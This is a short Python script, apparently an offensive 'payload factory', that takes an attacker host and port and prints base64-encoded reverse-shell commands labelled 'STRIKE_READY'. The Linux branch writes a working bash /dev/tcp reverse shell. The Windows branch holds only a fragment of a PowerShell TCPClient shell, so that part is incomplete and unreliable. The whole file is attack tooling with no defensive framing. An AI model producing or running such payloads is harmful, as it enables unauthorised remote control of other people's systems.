import sys, base64

def generate_payload(lhost, lport, os_type="linux"):
    print(f"[*] Generating {os_type} payload for {lhost}:{lport}")
    if os_type == "linux":
        raw = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    else:
        raw = f"$c = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
    
    encoded = base64.b64encode(raw.encode()).decode()
    return f"STRIKE_READY (B64): {encoded}"

if __name__ == "__main__":
    # Usage: python3 payload_factory.py <LHOST> <LPORT>
    if len(sys.argv) > 2: print(generate_payload(sys.argv[1], sys.argv[2]))
